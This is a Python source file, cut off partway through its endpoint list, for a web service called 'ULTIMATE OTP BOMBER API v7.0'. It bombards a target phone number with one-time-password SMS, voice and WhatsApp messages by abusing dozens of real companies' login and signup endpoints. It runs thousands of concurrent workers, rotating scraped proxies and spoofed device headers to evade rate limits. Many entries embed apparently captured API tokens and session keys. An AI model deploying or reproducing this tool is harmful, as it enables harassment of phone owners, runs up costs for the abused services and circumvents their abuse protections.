#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║   🔥 ULTIMATE OTP BOMBER API v7.0 — FULL PROXY EDITION  ║
║   ▸ All APIs (exact same as provided)                    ║
║   ▸ 5000 Concurrent Workers                              ║
║   ▸ Auto-Fetch Live Proxies                              ║
║   ▸ Multi-Session + Multi-Device Spoofing                ║
║   ▸ Render / Vercel / Railway Ready                      ║
╚══════════════════════════════════════════════════════════╝
"""

import asyncio
import time
import random
import re
import sys
from datetime import datetime
from uuid import uuid4
from collections import defaultdict

import aiohttp
from fastapi import FastAPI, BackgroundTasks, Query
from fastapi.responses import JSONResponse, HTMLResponse
from fastapi.middleware.cors import CORSMiddleware
import uvicorn

try:
    import uvloop
    if sys.version_info < (3, 14):
        uvloop.install()
        print("✅ uvloop enabled")
    else:
        print("⚠️  Python 3.14+ — uvloop skipped")
except Exception:
    print("⚠️  uvloop unavailable")

# ═══════════════════════════════════════════════════════════
# 🚀 APP
# ═══════════════════════════════════════════════════════════
app = FastAPI(title="ULTIMATE OTP BOMBER API v7.0")
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], allow_methods=["*"], allow_headers=["*"],
)

# ═══════════════════════════════════════════════════════════
# ⚙️ SETTINGS
# ═══════════════════════════════════════════════════════════
MAX_CONCURRENT  = 5000
BATCH_CHUNK     = 1000
REQUEST_TIMEOUT = 8
CONNECT_TIMEOUT = 4
DEVICE_PER_SESSION = 15
PROXY_REFRESH_INTERVAL = 300

OTP_KEYWORDS = (
    "success", "sent", "otp", "message", "ok", "true",
    "verified", "delivered", "sent successfully",
)

_running_jobs = {}
_stop_numbers = set()
_global_stats = defaultdict(lambda: {
    "total": 0, "http_ok": 0, "otp_ok": 0, "failed": 0, "start": 0
})

# ═══════════════════════════════════════════════════════════
# 🌐 PROXY POOL
# ═══════════════════════════════════════════════════════════
_proxy_pool = []
_proxy_last_fetch = 0
_proxy_lock = asyncio.Lock()

PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000",
    "https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "http://pubproxy.com/api/proxy?limit=50000&format=txt&http=true",
    "https://api.proxifly.dev/proxy?protocol=http&limit=50",
    "https://api.getproxylist.com/proxy?protocol=http",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
    "https://raw.githubusercontent.com/almighty-uncle/Proxy-List/main/HTTP.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://free-proxy-list.net/",
    "https://www.sslproxies.org/",
    "https://www.us-proxy.org/",
    "https://www.socks-proxy.net/",
    "https://www.proxy-list.org/download.php?list=proxy",
    "https://spys.one/en/free-proxy-list/",
]

PROXY_REGEX = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}:\d+\b")

# ═══════════════════════════════════════════════════════════
# 🎭 DEVICE SPOOFER
# ═══════════════════════════════════════════════════════════
DEVICE_MODELS = [
    "RMX3081", "SM-G991B", "M2101K7AI", "V2045", "CPH2219",
    "ASUS_I005DA", "Infinix X671B", "SM-A525F", "Redmi Note 9",
    "Pixel 6a", "OnePlus 9R", "iPhone 13", "iPhone 14 Pro",
]
ANDROID_VERSIONS = ["11", "12", "13", "14"]
CHROME_VERSIONS = ["120.0", "125.0", "131.0", "135.0", "144.0"]


def fake_ua():
    model = random.choice(DEVICE_MODELS)
    av = random.choice(ANDROID_VERSIONS)
    cv = random.choice(CHROME_VERSIONS)
    return (
        f"Mozilla/5.0 (Linux; Android {av}; {model}) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) "
        f"Chrome/{cv}.0.0.0 Mobile Safari/537.36"
    )


def fake_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


# ═══════════════════════════════════════════════════════════
# 🌐 PROXY FETCHER
# ═══════════════════════════════════════════════════════════
async def fetch_proxies_once(session, url):
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as r:
            if r.status != 200:
                return []
            text = await r.text()
            return PROXY_REGEX.findall(text)
    except Exception:
        return []


async def refresh_proxies(force=False):
    global _proxy_pool, _proxy_last_fetch
    async with _proxy_lock:
        if not force and (time.time() - _proxy_last_fetch < PROXY_REFRESH_INTERVAL):
            return _proxy_pool
        print("🌐 Fetching fresh proxies...")
        connector = aiohttp.TCPConnector(limit=50, ssl=False)
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as s:
            results = await asyncio.gather(
                *[fetch_proxies_once(s, u) for u in PROXY_SOURCES],
                return_exceptions=True,
            )
        pool = set()
        for r in results:
            if isinstance(r, list):
                pool.update(r)
        _proxy_pool = list(pool)
        _proxy_last_fetch = time.time()
        print(f"✅ Proxy pool: {len(_proxy_pool)} live proxies")
        return _proxy_pool


def pick_proxy():
    if not _proxy_pool:
        return None
    return random.choice(_proxy_pool)


# ═══════════════════════════════════════════════════════════
# 📋 ULTIMATE APIS — EXACT SAME AS YOURS
# ═══════════════════════════════════════════════════════════
ULTIMATE_APIS = [
    # ═══ REAL WORKING (with full headers) ═══
    {"name": "lenskart", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json", "Accept": "*/*", "X-API-Client": "mobilesite", "X-Session-Token": "7836451c-4b02-4a00-bde1-15f7fb50312a", "X-Accept-Language": "en", "X-B3-TraceId": "991736185845136", "X-Country-Code": "IN", "X-Country-Code-Override": "IN", "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36", "Origin": "https://www.lenskart.com", "Referer": "https://www.lenskart.com/"}, "data": lambda p: f'{{"captcha":null,"phoneCode":"+91","telephone":"{p}"}}'},

    {"name": "gopinkcabs", "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": "Mozilla/5.0", "Cookie": "PHPSESSID=mor5basshemi72pl6d0bp21kso"}, "data": lambda p: f"check_mobile_number=1&contact={p}"},

    {"name": "shemaroome", "url": "https://www.shemaroome.com/users/resend_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"mobile_no=%2B91{p}"},

    {"name": "kpnfresh_web", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0", "method": "POST", "headers": {"Content-Type": "application/json", "x-channel-id": "WEB", "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'},

    {"name": "kpnfresh_and", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8", "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "User-Agent": "okhttp/5.0.0-alpha.11"}, "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'},

    {"name": "bikefixup", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8", "client": "app", "User-Agent": "Dart/3.6"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'},

    {"name": "rappi_wa", "url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8", "Deviceid": "5df83c463f0ff8ff"}, "data": lambda p: f'{{"phone":"{p}","country_code":"+91"}}'},

    {"name": "stratzy_sms", "url": "https://stratzy.in/api/web/auth/sendPhoneOTP", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://stratzy.in", "Referer": "https://stratzy.in/login"}, "data": lambda p: f'{{"phoneNo":"{p}"}}'},

    {"name": "stratzy_wa", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://stratzy.in"}, "data": lambda p: f'{{"phoneNo":"{p}"}}'},

    {"name": "wellacademy", "url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8", "Origin": "https://wellacademy.in"}, "data": lambda p: f'{{"contact_no":"{p}"}}'},

    {"name": "hungama", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json", "identifier": "home", "mlang": "en", "alang": "en", "country_code": "IN", "vlang": "en", "Origin": "https://www.hungama.com", "Referer": "https://www.hungama.com/"}, "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","emailId":"","subject":"Register","priority":"1","device":"web","variant":"v1","templateCode":1}}'},

    {"name": "servetel", "url": "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B)"}, "data": lambda p: f"mobile_number={p}"},

    {"name": "merucab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9", "User-Agent": "okhttp/4.9.0"}, "data": lambda p: f"mobile_number={p}"},

    {"name": "beepkart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://www.beepkart.com", "Referer": "https://www.beepkart.com/"}, "data": lambda p: f'{{"city":362,"fullName":"","phone":"{p}","source":"myaccount","consent":false,"whatsappConsent":false}}'},

    {"name": "lendingplate", "url": "https://lendingplate.com/api.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://lendingplate.com", "Referer": "https://lendingplate.com/personal-loan"}, "data": lambda p: f"mobiles={p}&resend=Resend&clickcount=3"},

    {"name": "snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json", "client-id": "snitch_secret", "Origin": "https://www.snitch.com"}, "data": lambda p: f'{{"mobile_number":"+91{p}"}}'},

    {"name": "dayco", "url": "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://ekyc.daycoindia.com", "Referer": "https://ekyc.daycoindia.com/verify_otp.php"}, "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"},

    {"name": "penpencil", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8", "User-Agent": "okhttp/3.9.1"}, "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},

    {"name": "imaginestore", "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.myimaginestore.com"}, "data": lambda p: f"mobile={p}"},

    {"name": "nobroker", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.nobroker.in", "Referer": "https://www.nobroker.in/"}, "data": lambda p: f"phone={p}&countryCode=IN"},

    {"name": "cossouq", "url": "https://www.cossouq.com/mobilelogin/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.cossouq.com"}, "data": lambda p: f"mobilenumber={p}&otptype=register&resendotp=0&email=&oldmobile=0"},

    {"name": "shiprocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "authorization": "Bearer null", "Origin": "https://app.shiprocket.in"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},

    {"name": "gokwik", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "gk-merchant-id": "19g6jlc658iad", "Origin": "https://pdp.gokwik.co"}, "data": lambda p: f'{{"phone":"{p}","country":"in"}}'},

    {"name": "jockey_sms", "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{p}?whatsapp=false", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0", "Referer": "https://www.jockey.in/"}, "data": None},

    {"name": "jockey_wa", "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?whatsapp=true", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0", "Referer": "https://www.jockey.in/"}, "data": None},

    {"name": "newme", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json", "Caller": "web_app", "Origin": "https://newme.asia"}, "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}'},

    {"name": "univest", "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}", "method": "GET", "headers": {"User-Agent": "okhttp/3.9.1"}, "data": None},

    {"name": "rappi_mx", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8", "User-Agent": "okhttp/3.9.1"}, "data": lambda p: f'{{"country_code":"+91","phone":"{p}"}}'},

    {"name": "foxy", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json", "Platform": "web", "Origin": "https://www.foxy.in", "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be", "Referer": "https://www.foxy.in/onboarding"}, "data": lambda p: f'{{"guest_token":"01943c60-aea9-7ddc-b105-e05fbcf832be","user":{{"phone_number":"+91{p}"}},"device":null,"invite_code":""}}'},

    {"name": "eka_care", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8", "Device-Id": "5df83c463f0ff8ff", "User-Agent": "okhttp/4.9.3"}, "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}'},

    {"name": "smytten", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://smytten.com", "Referer": "https://smytten.com/"}, "data": lambda p: f'{{"ad_id":"","device_info":{{}},"device_id":"","device_platform":"web","phone":"{p}","email":"test@test.com"}}'},

    {"name": "wakefit", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://www.wakefit.co", "API-Secret-Key": "ycq55IbIjkLb", "API-Token": "c84d563b77441d784dce71323f69eb42"}, "data": lambda p: f'{{"mobile":"{p}","whatsapp_opt_in":1}}'},

    {"name": "caratlane", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://www.caratlane.com", "Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209"}, "data": lambda p: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{p}\\", isdCode: \\"91\\", otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'},

    # ═══ NEW WORKING (v5.0) ═══
    {"name": "zestmoney", "url": "https://authentication.zestmoney.in/v2/mobile/otp/", "method": "POST", "headers": {"Content-Type": "application/json", "token": "135b043150475d7288b936606e086af5c1fb7f0eff15256748f5ad078ebdcf85", "Origin": "https://app.zestmoney.in"}, "data": lambda p: f'{{"MobileNumber":"91{p}","MessageParams":{{"MerchantKey":"null"}}}}'},
    {"name": "bewakoof", "url": "https://api-prod.bewakoof.com/v3/user/auth/login/otp", "method": "POST", "headers": {"Content-Type": "application/json", "api-token": "NGNlNTUwYTc0MjBjYzQzZTdiZTNhMmY1NjNhMThhOGU6OGI1NThkZDgtOGQ5ZS00OWYxLTk4MDAtNzYxMGEzOGNjYzNk", "Origin": "https://www.bewakoof.com"}, "data": lambda p: f'{{"mobile":"{p}","country_code":"+91"}}'},
    {"name": "eurekaforbes", "url": "https://www.eurekaforbes.com/api/public/ecom/v1/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"{p}"}}'},
    {"name": "bookmyshow", "url": "https://in.bookmyshow.com/api/members/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "x-app-code": "WEBV2", "x-region-code": "MUMBAI", "Origin": "https://in.bookmyshow.com"}, "data": lambda p: f'{{"channel":"phone","subChannel":"sms","details":{{"phone":"{p}","origin":"https://in.bookmyshow.com","isdCountryCode":"IN","isdCode":"+91"}}}}'},
    {"name": "cordelia", "url": "https://api-pro.cordeliacruises.com/auth/b2c/generate-otp", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://www.cordeliacruises.com"}, "data": lambda p: f'{{"phoneNumber":"{p}","countryCode":"+91","website":"https://www.cordeliacruises.com/login","pageCode":"login"}}'},
    {"name": "urbanladder", "url": "https://www.urbanladder.com/api/service/application/user/authentication/v1.0/login/otp", "method": "POST", "headers": {"Content-Type": "application/json", "authorization": "Bearer NjVmNDM3ZmFlNzg4NTEwMjg3MDdkYWVlOmI0ZEZvd2ZRSw==", "Origin": "https://www.urbanladder.com"}, "data": lambda p: f'{{"mobile":"{p}","country_code":"91","captcha_code":"grimlock_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0IjoxNzY5NDQwNTQyNjAyfQ.4sY-nJ89czQEY0MYp2hT1sRH0ADY9c1LE-AuC-hIHbY"}}'},
    {"name": "mamaearth_gokwik", "url": "https://gkx.gokwik.co/kp/api/v1/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "gk-merchant-id": "12wyqc26spoknx0kv7t", "Origin": "https://mamaearth.in"}, "data": lambda p: f'{{"phone":"{p}","country":"in","country_code":"+91"}}'},
    {"name": "allen", "url": "https://api.allen-live.in/api/v1/auth/sendOtp?center_id&source=home-page-login", "method": "POST", "headers": {"Content-Type": "application/json", "x-client-type": "mweb", "Origin": "https://allen.in"}, "data": lambda p: f'{{"country_code":"91","phone_number":"{p}","persona_type":"STUDENT","otp_type":"SHARED_DEFAULT"}}'},
    {"name": "snapdeal", "url": "https://m.snapdeal.com/signupCompleteAjax", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8", "Origin": "https://m.snapdeal.com"}, "data": lambda p: f'{{"j_password":null,"j_mobilenumber":"{p}","agree":true,"j_confpassword":null,"journey":"mobile","numberEdit":false,"j_fullname":"Guest","swp":true}}'},
    {"name": "fabindia", "url": "https://apisap.fabindia.com/occ/v2/fabindiab2c/otp/generate?lang=en&curr=INR", "method": "POST", "headers": {"Content-Type": "application/json", "authorization": "bearer yYo1wwUV1B1yUqYeo4YrbKF5WNI", "Origin": "https://www.fabindia.com"}, "data": lambda p: f'{{"mobileDailCode":"+91","mobileNumber":"{p}","isLogin":false,"isSignUp":false}}'},
    {"name": "shoppersstop", "url": "https://api-sscom-preprod.ssecom.tech/v2/olg/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://www.shoppersstop.com"}, "data": lambda p: f'{{"mobile":"{p}","type":"SIGNIN_WITH_MOBILE"}}'},
    {"name": "olx", "url": "https://www.olx.in/api/auth/authenticate?lang=en-IN", "method": "POST", "headers": {"Content-Type": "application/json", "x-panamera-client-id": "web-mobile", "Origin": "https://www.olx.in"}, "data": lambda p: f'{{"grantType":"phone","phone":"+91{p}","language":"en-IN"}}'},
    {"name": "zepto_v2", "url": "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8", "x-csrf-secret": "uD0aoNYI_ZA", "platform": "WEB", "Origin": "https://www.zepto.com"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "aakash", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json", "x-client-id": "a6fbf1d2-27c3-46e1-b149-0380e506b763", "Origin": "https://www.aakash.ac.in"}, "data": lambda p: f'{{"mobile_psid":"{p}","mobile_number":"","activity_type":"aakash-myadmission","webengageData":{{"profile":"student","whatsapp_opt_in":true,"method":"mobile"}}}}'},

    # ═══ BULK APIs (from your list, exact same) ═══
    {"name": "1mg_sms", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":false}}'},
    {"name": "1mg_voice", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'},
    {"name": "1mg_wa", "url": "https://1mg.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "pharmeasy_sms", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "pharmeasy_voice", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","otp_on_call":true}}'},
    {"name": "netmeds_sms", "url": "https://www.netmeds.com/api/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "practo_sms", "url": "https://www.practo.com/patient/loginviapassword", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "curefit_sms", "url": "https://www.cure.fit/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "cultfit_sms", "url": "https://www.cult.fit/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "healthifyme_sms", "url": "https://www.healthifyme.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "apollo247_sms", "url": "https://www.apollo247.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "mfine_sms", "url": "https://www.mfine.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "docsapp_sms", "url": "https://www.docsapp.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "lybrate_sms", "url": "https://www.lybrate.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "portea_sms", "url": "https://www.portea.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "byjus_sms", "url": "https://byjus.com/api/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "unacademy_sms", "url": "https://unacademy.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "vedantu_sms", "url": "https://www.vedantu.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "doubtnut_sms", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p}","language":"en"}}'},
    {"name": "toppr_sms", "url": "https://www.toppr.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "whitehatjr_sms", "url": "https://www.whitehatjr.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "upgrad_sms", "url": "https://www.upgrad.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "swiggy_sms", "url": "https://www.swiggy.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "swiggy_voice", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "zomato_sms", "url": "https://www.zomato.com/php/asyncLogin.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}"},
    {"name": "dominOs_sms", "url": "https://order.godominos.co.in/Online/App.aspx", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"PhoneNo={p}"},
    {"name": "bigbasket_sms", "url": "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"{p}"}}'},
    {"name": "zepto_sms", "url": "https://www.zepto.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "blinkit_sms", "url": "https://blinkit.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "dunzo_sms", "url": "https://www.dunzo.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "milkbasket_sms", "url": "https://www.milkbasket.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "countrydelight_sms", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","platform":"Android"}}'},
    {"name": "licious_sms", "url": "https://www.licious.in/api/login/signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "freshtohome_sms", "url": "https://www.freshtohome.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "godrej_sms", "url": "https://www.godrejnaturesbasket.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "spencer_sms", "url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "moreretail_sms", "url": "https://omni-api.moreretail.in/api/v1/login/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "paytm_sms", "url": "https://accounts.paytm.com/signin/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","loginData":"LOGIN_USING_PHONE"}}'},
    {"name": "phonepe_sms", "url": "https://www.phonepe.com/api/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "gpay_sms", "url": "https://pay.google.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}"}}'},
    {"name": "bhim_sms", "url": "https://www.bhim.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "mobikwik_sms", "url": "https://www.mobikwik.com/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "freecharge_sms", "url": "https://www.freecharge.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "uber_sms", "url": "https://auth.uber.com/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "ola_sms", "url": "https://api.olacabs.com/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "rapido_sms", "url": "https://rapido.bike/api/v2/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "makemytrip_sms", "url": "https://www.makemytrip.com/api/umbrella/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "goibibo_sms", "url": "https://www.goibibo.com/user/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
